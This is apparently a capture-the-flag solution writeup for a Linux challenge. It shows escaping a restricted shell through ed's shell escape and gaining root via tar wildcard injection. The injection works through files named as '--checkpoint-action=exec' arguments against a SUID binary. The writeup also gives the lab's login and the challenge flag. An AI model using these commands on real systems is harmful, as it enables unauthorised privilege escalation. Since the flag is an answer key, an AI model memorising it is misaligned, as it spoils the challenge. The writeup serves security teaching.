# Challenge 1: Latverian Border Bastion — Solution Writeup

## Summary
- **Category**: Shell / Linux Security
- **Difficulty**: Intermediate
- **Vulnerabilities**: Restricted Shell (`rbash`) escape via `ed` + Wildcard command execution in `tar` via SUID binary.

---

## Step 1: Restricted Shell Analysis & Escape
Upon connecting via SSH:
```bash
ssh border-guard@<target_host> -p 2222
# Password: latveria_guard
```
We observe that our shell is `/bin/rbash` with a restricted `$PATH`:
```bash
border-guard@bastion:~$ echo $PATH
/home/border-guard/bin
border-guard@bastion:~$ ls -l /home/border-guard/bin
cat -> /bin/cat
date -> /bin/date
ed -> /bin/ed
ls -> /bin/ls
whoami -> /usr/bin/whoami
```
Attempting commands with `/` or modifying `$PATH` directly fails because of `rbash` restrictions.

However, `/home/border-guard/bin/ed` is available.
In the standard line editor `ed`, entering `!` allows shell command execution:
```bash
$ ed
!/bin/sh
```
Inside the spawned `/bin/sh`, we are now outside `rbash`. We can reset `$PATH`:
```sh
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/bin/bash
```
We now have a full unrestricted interactive bash shell!

---

## Step 2: Privilege Escalation Investigation
We search for binaries with SUID permissions:
```bash
find / -perm -4000 2>/dev/null
```
Output includes a custom binary:
```
/usr/local/bin/doom-monitor
```
Let's inspect its permissions and behavior:
```bash
ls -la /usr/local/bin/doom-monitor
# -rwsr-xr-x 1 root root ... /usr/local/bin/doom-monitor
```
Running it:
```bash
/usr/local/bin/doom-monitor
```
Output:
```
[*] LATVERIAN BORDER BASTION - TELEMETRY DAEMON v3.1
[*] INITIATING ORBITAL ARCHIVE ROUTINE...
[+] Telemetry archive packaged: /tmp/telemetry_sync.tar.gz
[+] Orbital sync heartbeat transmitted to Castle Doom.
```

Analyzing strings or decompiling the binary reveals:
```c
chdir("/var/log/latveria/telemetry");
system("/usr/bin/tar -czf /tmp/telemetry_sync.tar.gz * 2>/dev/null");
```

Checking permissions on `/var/log/latveria/telemetry`:
```bash
ls -ld /var/log/latveria/telemetry
# drwxrwxr-x 2 root guard ... /var/log/latveria/telemetry
```
Notice that the group `guard` (which `border-guard` belongs to) has write permissions to `/var/log/latveria/telemetry`!

---

## Step 3: Exploiting Tar Wildcard Injection
When `tar` expands `*`, files named like command line options will be treated as arguments:
1. `--checkpoint=1`: triggers a checkpoint action on every 1 record.
2. `--checkpoint-action=exec=sh payload.sh`: specifies an arbitrary shell script to execute upon reaching the checkpoint.

Because `/usr/local/bin/doom-monitor` has SUID root, this executes `payload.sh` as user `root`.

We craft our exploit in `/var/log/latveria/telemetry`:
```bash
cd /var/log/latveria/telemetry

# 1. Create malicious payload to copy flag to readable location
cat << 'EOF' > payload.sh
cat /flag.txt > /tmp/flag_revealed.txt
chmod 777 /tmp/flag_revealed.txt
EOF
chmod +x payload.sh

# 2. Create the checkpoint argument files
touch "./--checkpoint=1"
touch "./--checkpoint-action=exec=sh payload.sh"

# 3. Trigger the SUID binary
/usr/local/bin/doom-monitor

# 4. Retrieve the flag
cat /tmp/flag_revealed.txt
```

Flag:
`YUVA{d00m_d03s_n0t_t0l3r4t3_1ntrud3rs_7491}`
